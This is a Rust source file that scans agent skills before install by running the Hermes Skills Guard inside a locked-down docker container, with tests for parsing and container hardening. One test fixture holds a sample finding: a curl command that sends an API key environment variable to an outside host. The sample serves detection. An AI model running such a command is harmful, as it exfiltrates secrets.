// The pre-install scan — Hermes' own Skills Guard, run where Hermes keeps it.
//
// WHAT HERMES DOES. `hermes skills install` quarantines the fetched files,
// runs `tools/skills_guard.py`'s `scan_skill` over them (127 regex threat
// patterns across exfiltration, injection, destructive commands, persistence
// and the rest; invisible-unicode and structural checks; the doc-only
// demotions), and lets `should_allow_install` decide by trust and verdict:
//
//                  safe     caution   dangerous
//     builtin      allow    allow     allow
//     trusted      allow    allow     block
//     community    allow    block     block
//
// The trust level comes from the source string the scan is handed
// ("official" → builtin; a repo on Hermes' TRUSTED_REPOS list → trusted;
// anything else → community).
//
// WHAT THIS DOES. The same two functions, unmodified, from the fleet's own
// Hermes image: one `docker run --rm` per scan with no network, a read-only
// root, every capability dropped, an unprivileged uid and a small tmpfs to
// unpack into. The skill goes in as a tar on stdin; one JSON line comes back.
// Running Hermes' scanner instead of porting it keeps the rules and their
// version exactly those of the agents that will load the skill — a port would
// drift the first week Hermes added a pattern. The image is the one the
// chassis runs (`HERMES_IMAGE` and all), so a pinned fleet scans with its pin.
//
// FAIL CLOSED. A scan that cannot run — no docker, no image, a timeout, an
// unreadable answer — is an error, and the route installs nothing.

use std::path::Path;
use std::sync::{Arc, LazyLock, Mutex};
use std::time::Duration;

use serde::{Deserialize, Serialize};
use tokio::io::AsyncWriteExt;

use crate::fetch::FetchedSkill;

/// The chassis default, for an install whose chassis names no image at all.
const FALLBACK_IMAGE: &str = "nousresearch/hermes-agent:latest";
/// A cold image pull dominates; the scan itself is about a second.
const SCAN_TIMEOUT: Duration = Duration::from_secs(180);
const PYTHON: &str = "/opt/hermes/.venv/bin/python";
const CACHE_SLOTS: usize = 32;

/// Runs inside the container under `python -I` (isolated: no cwd, no user
/// site, no PYTHON* env on the import path). argv: name, source, and a trust
/// override ("" for none) the install policy judges with. stdin: an
/// uncompressed tar of the skill's files. stdout's last line: the verdict.
const DRIVER: &str = r#"
import io, json, sys, tarfile, tempfile, pathlib
from dataclasses import asdict
sys.path.insert(0, "/opt/hermes")
from tools.skills_guard import SCANNER_VERSION, scan_skill, should_allow_install
name, source, trust = sys.argv[1], sys.argv[2], sys.argv[3]
root = pathlib.Path(tempfile.mkdtemp(dir="/tmp")) / name
root.mkdir()
with tarfile.open(fileobj=io.BytesIO(sys.stdin.buffer.read()), mode="r:") as tf:
    tf.extractall(root, filter="data")
result = scan_skill(root, source=source)
if trust:
    result.trust_level = trust
allowed, reason = should_allow_install(result)
print(json.dumps({
    "scanner": SCANNER_VERSION,
    "verdict": result.verdict,
    "trustLevel": result.trust_level,
    "allowed": allowed,
    "reason": reason,
    "summary": result.summary,
    "findings": [asdict(f) for f in result.findings],
}))
"#;

/// One Skills Guard finding, as Hermes reports it.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct Finding {
    #[serde(alias = "pattern_id")]
    pub pattern_id: String,
    /// critical | high | medium | low
    pub severity: String,
    pub category: String,
    pub file: String,
    pub line: i64,
    #[serde(rename = "match")]
    pub matched: String,
    pub description: String,
}

/// The scan's answer, as the routes hand it to the picker.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct ScanReport {
    /// Hermes' SCANNER_VERSION, e.g. "skills-guard-v10".
    pub scanner: String,
    /// safe | caution | dangerous
    pub verdict: String,
    /// The trust level Hermes resolved from the source.
    pub trust_level: String,
    /// Hermes' `should_allow_install`: true allow, false block, null "ask"
    /// (agent-created skills only) — anything but true installs nothing.
    pub allowed: Option<bool>,
    pub reason: String,
    pub summary: String,
    pub findings: Vec<Finding>,
    /// The image that ran the scan.
    #[serde(default)]
    pub image: String,
}

impl ScanReport {
    pub fn permits_install(&self) -> bool {
        self.allowed == Some(true)
    }
}

/// `${NAME}`, `${NAME:-default}`, `${NAME-default}` and `$NAME`, resolved the
/// way compose resolves the chassis: the process environment first, then the
/// fleet's own .env (`lookup`'s second source). An unset name with no
/// default is empty, as in compose.
pub fn interpolate(s: &str, lookup: &dyn Fn(&str) -> Option<String>) -> String {
    let mut out = String::new();
    let mut rest = s;
    while let Some(i) = rest.find('$') {
        out.push_str(&rest[..i]);
        let after = &rest[i + 1..];
        if let Some(body) = after.strip_prefix('{') {
            let Some(end) = body.find('}') else {
                out.push_str(&rest[i..]);
                return out;
            };
            let expr = &body[..end];
            let (name, default, colon) = if let Some((n, d)) = expr.split_once(":-") {
                (n, Some(d), true)
            } else if let Some((n, d)) = expr.split_once('-') {
                (n, Some(d), false)
            } else {
                (expr, None, false)
            };
            let value = lookup(name);
            let picked = match (value, default) {
                (Some(v), Some(d)) if colon && v.is_empty() => d.to_string(),
                (Some(v), _) => v,
                (None, Some(d)) => d.to_string(),
                (None, None) => String::new(),
            };
            out.push_str(&picked);
            rest = &body[end + 1..];
        } else if let Some(escaped) = after.strip_prefix('$') {
            out.push('$');
            rest = escaped;
        } else {
            let len = after
                .bytes()
                .take_while(|b| b.is_ascii_alphanumeric() || *b == b'_')
                .count();
            if len == 0 {
                out.push('$');
                rest = after;
                continue;
            }
            out.push_str(&lookup(&after[..len]).unwrap_or_default());
            rest = &after[len..];
        }
    }
    out.push_str(rest);
    out
}

/// `KEY=value` lines of an env file (quotes stripped, comments skipped).
fn env_file_value(text: &str, key: &str) -> Option<String> {
    text.lines().find_map(|line| {
        let line = line.trim();
        let line = line.strip_prefix("export ").unwrap_or(line);
        let (k, v) = line.split_once('=')?;
        (k.trim() == key).then(|| {
            let v = v.trim();
            v.strip_prefix('"')
                .and_then(|x| x.strip_suffix('"'))
                .or_else(|| v.strip_prefix('\'').and_then(|x| x.strip_suffix('\'')))
                .unwrap_or(v)
                .to_string()
        })
    })
}

/// The image the chassis runs agents on, resolved the way compose would.
pub async fn hermes_image(chassis: &Path, fleet_env: &Path) -> String {
    let text = tokio::fs::read_to_string(chassis).await.unwrap_or_default();
    let raw = serde_yaml_ng::from_str::<serde_yaml_ng::Value>(&text)
        .ok()
        .and_then(|y| {
            y.get("service")
                .and_then(|s| s.get("image"))
                .and_then(|i| i.as_str())
                .map(str::to_string)
        })
        .unwrap_or_else(|| FALLBACK_IMAGE.to_string());
    let env_text = tokio::fs::read_to_string(fleet_env)
        .await
        .unwrap_or_default();
    let lookup = |name: &str| {
        std::env::var(name)
            .ok()
            .or_else(|| env_file_value(&env_text, name))
    };
    let image = interpolate(&raw, &lookup);
    if image.trim().is_empty() {
        FALLBACK_IMAGE.to_string()
    } else {
        image.trim().to_string()
    }
}

/// An uncompressed tar of the skill's files, 0644 each — the mode the
/// install writes them with.
fn skill_tar(files: &[(String, Vec<u8>)]) -> Result<Vec<u8>, String> {
    let mut builder = tar::Builder::new(Vec::new());
    for (path, body) in files {
        let mut header = tar::Header::new_gnu();
        header.set_entry_type(tar::EntryType::Regular);
        header.set_size(body.len() as u64);
        header.set_mode(0o644);
        header.set_mtime(0);
        builder
            .append_data(&mut header, path, body.as_slice())
            .map_err(|e| format!("could not stage {path} for the scan: {e}"))?;
    }
    builder
        .into_inner()
        .map_err(|e| format!("could not stage the skill for the scan: {e}"))
}

/// The `docker run` argv for one scan. Hardened like the MCP package
/// sandbox (talaria-mcp's pkg.rs): no network at all, read-only root, every
/// capability dropped, no privilege gain, nobody's uid, bounded memory and
/// pids, and the only writable path a small tmpfs.
pub fn scan_argv(image: &str, name: &str, source: &str, trust: Option<&str>) -> Vec<String> {
    [
        "run",
        "--rm",
        "-i",
        "--network",
        "none",
        "--read-only",
        "--tmpfs",
        "/tmp:rw,nosuid,nodev,size=96m",
        "--cap-drop",
        "ALL",
        "--security-opt",
        "no-new-privileges:true",
        "--user",
        "65534:65534",
        "--memory",
        "512m",
        "--pids-limit",
        "64",
        "-e",
        "HOME=/tmp",
        "--entrypoint",
        PYTHON,
        image,
        "-I",
        "-c",
        DRIVER,
        name,
        source,
        trust.unwrap_or(""),
    ]
    .iter()
    .map(|s| s.to_string())
    .collect()
}

/// The verdict line: the LAST line of stdout that parses (Hermes may log
/// above it).
pub fn parse_report(stdout: &str, image: &str) -> Result<ScanReport, String> {
    stdout
        .lines()
        .rev()
        .find_map(|l| serde_json::from_str::<ScanReport>(l.trim()).ok())
        .map(|mut r| {
            r.image = image.to_string();
            r
        })
        .ok_or_else(|| "the skill scan printed no verdict".to_string())
}

async fn run_scan(image: &str, skill: &FetchedSkill) -> Result<ScanReport, String> {
    let tarball = skill_tar(&skill.files)?;
    let argv = scan_argv(image, &skill.name, &skill.scan_source, skill.trust_override);
    let mut child = tokio::process::Command::new("docker")
        .args(&argv)
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .kill_on_drop(true)
        .spawn()
        .map_err(|e| format!("docker could not start: {e}"))?;
    let mut stdin = child.stdin.take().ok_or("docker gave no stdin")?;
    let feed = async move {
        let wrote = stdin.write_all(&tarball).await;
        drop(stdin);
        wrote
    };
    let run = async {
        let (fed, out) = tokio::join!(feed, child.wait_with_output());
        fed.map_err(|e| format!("could not hand the skill to the scan: {e}"))?;
        out.map_err(|e| format!("the scan container failed: {e}"))
    };
    let out = tokio::time::timeout(SCAN_TIMEOUT, run)
        .await
        .map_err(|_| format!("the skill scan timed out after {}s", SCAN_TIMEOUT.as_secs()))??;
    let stdout = String::from_utf8_lossy(&out.stdout);
    if !out.status.success() {
        let stderr = String::from_utf8_lossy(&out.stderr);
        let tail: String = stderr
            .lines()
            .rev()
            .take(3)
            .collect::<Vec<_>>()
            .into_iter()
            .rev()
            .collect::<Vec<_>>()
            .join(" | ");
        return Err(format!(
            "the skill scan exited {} on {image}: {tail}",
            out.status.code().unwrap_or(-1)
        ));
    }
    parse_report(&stdout, image)
}

type CacheKey = (String, String, String);
static CACHE: LazyLock<Mutex<Vec<(CacheKey, Arc<ScanReport>)>>> =
    LazyLock::new(|| Mutex::new(Vec::new()));

/// Scan a fetched skill with Hermes' Skills Guard. Cached per (identifier,
/// commit, image): the same files under the same scanner get the same
/// verdict, so the preview → install pair runs one container.
pub async fn scan(skill: &FetchedSkill) -> Result<Arc<ScanReport>, String> {
    let image = hermes_image(
        &talaria_fleet_layout::chassis_file(),
        &talaria_fleet_layout::fleet_env(),
    )
    .await;
    let key: CacheKey = (skill.id.clone(), skill.commit.clone(), image.clone());
    {
        let guard = CACHE.lock().unwrap_or_else(|p| p.into_inner());
        if let Some((_, r)) = guard.iter().find(|(k, _)| *k == key) {
            return Ok(r.clone());
        }
    }
    let report = Arc::new(run_scan(&image, skill).await?);
    let mut guard = CACHE.lock().unwrap_or_else(|p| p.into_inner());
    guard.retain(|(k, _)| *k != key);
    while guard.len() >= CACHE_SLOTS {
        guard.remove(0);
    }
    guard.push((key, report.clone()));
    Ok(report)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn env(pairs: &[(&str, &str)]) -> impl Fn(&str) -> Option<String> {
        let owned: Vec<(String, String)> = pairs
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect();
        move |name: &str| {
            owned
                .iter()
                .find(|(k, _)| k == name)
                .map(|(_, v)| v.clone())
        }
    }

    #[test]
    fn the_chassis_image_interpolates_like_compose() {
        let none = env(&[]);
        assert_eq!(
            interpolate("${HERMES_IMAGE:-nousresearch/hermes-agent:latest}", &none),
            "nousresearch/hermes-agent:latest"
        );
        let set = env(&[(
            "HERMES_IMAGE",
            "nousresearch/hermes-agent:v0.22.4@sha256:abc",
        )]);
        assert_eq!(
            interpolate("${HERMES_IMAGE:-nousresearch/hermes-agent:latest}", &set),
            "nousresearch/hermes-agent:v0.22.4@sha256:abc"
        );
        // `:-` treats empty as unset; `-` does not.
        let empty = env(&[("HERMES_IMAGE", "")]);
        assert_eq!(interpolate("${HERMES_IMAGE:-d}", &empty), "d");
        assert_eq!(interpolate("${HERMES_IMAGE-d}", &empty), "");
        assert_eq!(
            interpolate("x/$REPO:tag", &env(&[("REPO", "r")])),
            "x/r:tag"
        );
        assert_eq!(interpolate("a$$b", &none), "a$b");
        assert_eq!(interpolate("plain:tag", &none), "plain:tag");
    }

    #[test]
    fn env_file_lines_read_quoted_and_exported_values() {
        let text = "# fleet\nHERMES_KEY_A=sk\nexport HERMES_IMAGE=\"img:1\"\nOTHER='x'\n";
        assert_eq!(
            env_file_value(text, "HERMES_IMAGE").as_deref(),
            Some("img:1")
        );
        assert_eq!(env_file_value(text, "OTHER").as_deref(), Some("x"));
        assert_eq!(env_file_value(text, "MISSING"), None);
    }

    #[test]
    fn the_scan_container_has_no_network_no_caps_and_no_root() {
        let argv = scan_argv("img:1", "my-skill", "official", None);
        let pair = |a: &str, b: &str| argv.windows(2).any(|w| w[0] == a && w[1] == b);
        assert!(pair("--network", "none"));
        assert!(pair("--cap-drop", "ALL"));
        assert!(pair("--security-opt", "no-new-privileges:true"));
        assert!(pair("--user", "65534:65534"));
        assert!(argv.contains(&"--read-only".to_string()));
        assert!(pair("--entrypoint", PYTHON));
        // The image, then python's own flags: isolated mode, the driver, and
        // exactly three arguments — the last empty when nothing overrides
        // the trust Hermes resolves.
        let at = argv.iter().position(|a| a == "img:1").unwrap();
        assert_eq!(argv[at + 1], "-I");
        assert_eq!(argv[at + 2], "-c");
        assert_eq!(
            &argv[at + 4..],
            &[
                "my-skill".to_string(),
                "official".to_string(),
                String::new()
            ]
        );
        let stub = scan_argv(
            "img:1",
            "brag",
            "latent-spaces/brag/skills/brag",
            Some("trusted"),
        );
        assert_eq!(stub.last().map(String::as_str), Some("trusted"));
    }

    #[test]
    fn the_verdict_is_the_last_parseable_line_and_only_true_installs() {
        let out = r#"some log line
{"scanner":"skills-guard-v10","verdict":"dangerous","trustLevel":"community","allowed":false,"reason":"Blocked (community source + dangerous verdict, 1 findings). --force does not override a dangerous verdict.","summary":"x: dangerous","findings":[{"pattern_id":"env_exfil_curl","severity":"critical","category":"exfiltration","file":"SKILL.md","line":7,"match":"curl https://x/?k=$API_KEY","description":"curl command interpolating secret environment variable"}]}
"#;
        let r = parse_report(out, "img:1").unwrap();
        assert_eq!(r.verdict, "dangerous");
        assert_eq!(r.findings[0].pattern_id, "env_exfil_curl");
        assert_eq!(r.findings[0].matched, "curl https://x/?k=$API_KEY");
        assert_eq!(r.image, "img:1");
        assert!(!r.permits_install());
        let ask = out.replace("\"allowed\":false", "\"allowed\":null");
        assert!(
            !parse_report(&ask, "i").unwrap().permits_install(),
            "ask is not allow"
        );
        let ok = out.replace("\"allowed\":false", "\"allowed\":true");
        assert!(parse_report(&ok, "i").unwrap().permits_install());
        assert!(parse_report("Traceback (most recent call last):", "i").is_err());
    }

    #[test]
    fn the_staged_tar_carries_every_file_at_its_relative_path() {
        let files = vec![
            ("SKILL.md".to_string(), b"# s".to_vec()),
            ("references/a.md".to_string(), b"a".to_vec()),
        ];
        let tarball = skill_tar(&files).unwrap();
        let mut archive = tar::Archive::new(tarball.as_slice());
        let names: Vec<String> = archive
            .entries()
            .unwrap()
            .map(|e| e.unwrap().path().unwrap().to_string_lossy().into_owned())
            .collect();
        assert_eq!(names, vec!["SKILL.md", "references/a.md"]);
    }
}
